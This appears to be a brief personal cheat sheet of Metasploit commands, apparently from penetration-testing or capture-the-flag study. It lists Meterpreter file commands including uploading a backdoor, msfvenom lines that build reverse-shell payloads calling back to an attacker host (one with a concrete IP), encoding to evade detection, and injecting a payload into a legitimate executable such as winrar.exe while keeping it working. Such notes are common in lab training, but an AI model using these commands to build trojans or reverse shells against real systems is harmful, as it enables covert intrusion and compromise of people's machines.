# Meterpreter

- lls : local ls
- lpwd : local pwd
- lcd : local cd
- pwd : remote pwd
- ls : remote ls
- edit <txtfile_path>
- download flag.zip
- upload <backdoor_file>
- checksum md5 <file_path>
- getenv PATH

# Import nmap output in msf:

- db_status
- db_import /PATH-TO-SCAN-RESULTS/SCAN.xml
- hosts
- services 

# msfvenom:
- -a x86 : specify arch
- -p : specify payload
- LHOST,LPORT : specify local host and port
- -f : specify format eg. exe
- `msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST-<ip> LPORT=<port> -f exe > sample.exe`
- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.196.85.2 LPORT=5555 -f elf > payload.bin`
- `msfvenom --list payloads`
- `msfvenom --list formats`

# Encoding:

- `msfvenom --list encoders` : x86/shikata_ga_nai
- -i : iterations of encoding
- -e : encoder to use

# Injecting payload in exe:

- -x : specify executable path like winrar.exe
- -k : to keep original functionality of exe specified above upon exec

# resource scripts (automating):

- /usr/share/metasploit-framework/scripts/resource/
- create .rc file with steps line-by-line
- msfconsole -r <script_file>
- from inside msfconsole, msf6> resource <path_to_rc>